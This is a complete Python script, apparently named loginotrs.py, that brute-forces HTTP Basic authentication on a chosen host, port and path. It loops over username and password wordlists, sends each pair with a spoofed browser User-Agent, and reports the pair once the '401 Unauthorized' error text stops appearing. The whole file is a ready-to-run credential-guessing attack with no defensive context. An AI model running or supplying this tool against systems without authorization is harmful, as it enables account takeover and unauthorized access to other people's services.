import base64
import requests
from os.path import exists
from os import system
import argparse
import time

b1='\033[1;34;48m'
r1='\033[1;34;31m'
g1='\033[1;34;32m'
e1='\033[0m'


def tryToConnect(user, passw, host, port, dire, errorMessage):
  m = str(user+":"+passw).encode('ascii')
  b = base64.b64encode(m)
  hostname = 'http://{}:{}/{}'.format(host, port, dire)

  headers = {
    "Host":"{}:{}".format(host, port),
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4482.0 Safari/537.36 Edg/92.0.874.0",
    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language":"en-US,en;q=0.5",
    "Accept-Encoding":"gzip, deflate",
    "Connection":"close",
    "Upgrade-Insecure-Requests":"1",
    "Authorization":"Basic " + str(b.decode('ascii'))
  }

  r = requests.get(hostname, headers=headers)

  try:
    if str(r.text).index(errorMessage):
      pass
  except:
      print("[+] Success - user: {} and password: {}".format(user, passw))
      exit()


def openFile(filename):
  if exists(filename):
    f = open(filename, 'r', encoding='latin-1').readlines()
    return f
  return 0


def log(host, port, sub):
  print("{}Starting script...{}".format(r1,e1))
  print("Host: {}{}{}".format(g1, host, e1))
  print("Port: {}{}{}".format(g1, str(port), e1))
  if sub != "":
    print("Subdirectory: {}{}{}".format(g1, sub, e1))
  print("-----------------------------------------------------------")


def main():
  system("clear")
  arg_parser = argparse.ArgumentParser(prog='loginotrs.py', allow_abbrev=False)
  arg_parser.add_argument('-u', type=str, help="List of Username", metavar='', required=True)
  arg_parser.add_argument('-p', type=str, help="List of Passwrod", metavar='', required=True)
  arg_parser.add_argument('-port', type=int, default=80, help="Port", metavar='')
  arg_parser.add_argument('-host', type=str, help="Host ip", metavar='', required=True)
  arg_parser.add_argument('-sub', type=str, help="Get directory", metavar='')
  arg_parser.add_argument('-errormessage', type=str, default='401 Unauthorized', help="Error message")
  args = arg_parser.parse_args()

  senhas = openFile(args.p)
  users = openFile(args.u)
  host = args.host
  port = args.port
  dire = ""
  errorMessage = args.errormessage

  if args.sub:
    dire = args.sub
  
  log(host, port, dire)

  if users != 0:
    if senhas != 0:
      for u in users:
        for p in senhas:
          user = u.strip()
          passw = p.strip()
          message = "[+] Testing username: {} and password: {}".format(user, passw)
          print(message, end="\r", flush=True)
          tryToConnect(user, passw, host, port, dire, errorMessage)
          time.sleep(0.1)
          print((" " * len(message)) + "\r", end="", flush=True)
    else:
      print("Arquivos nao encontrado: " + args.p)
  else:
    print("Arquivos nao encontrado: " + args.u)


if __name__ == "__main__":
  main()